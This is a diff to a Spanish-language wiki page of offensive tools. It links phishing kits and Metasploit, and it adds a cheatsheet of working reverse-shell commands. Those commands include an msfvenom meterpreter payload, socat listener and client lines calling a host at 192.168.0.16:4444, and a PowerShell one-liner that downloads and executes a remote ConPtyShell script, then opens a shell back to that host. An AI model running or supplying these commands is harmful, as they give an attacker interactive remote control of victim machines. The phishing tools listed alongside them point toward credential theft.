@@ -1,4 +1,4 @@
-= Herramientas =
+= Herramientas enlaces =
 - [[https://github.com/htr-tech/zphisher|zphisher]]
 - [[https://github.com/UndeadSec/EvilURL|EvilUrl]]
 - [[https://github.com/gophish/gophish|gophish]]
@@ -8,3 +8,23 @@
 - [[netcat]]
 - [[https://github.com/FDX100/GOD-KILLERhttps://github.com/FDX100/GOD-KILLER|GOD-KILLER(SMS)]]
 - [[https://computingforgeeks.com/install-metasploit-framework-on-debian/|instalación metasploit]]
+= Cheatsheet =
+=== Reverse shell meterpreter ===
+{{{bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.16 LPORT=4444 -f exe > reverse.exe
+}}}
+=== Reverse shell socat ===
+{{{bash
+socat file:`tty`,raw,echo=0 TCP-L:4444
+socat exec:bash,pty,stderr,setsid,sigint,sane tcp:192.168.0.16:4444
+}}}
+=== Reverse shell windows guapificado ===
+- Servidor
+{{{bash
+stty raw -echo; (stty size; cat) | nc -lvnp 4444
+}}}
+- Cliente
+{{{batch
+powershell -c IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.0.16 4444
+}}}
+
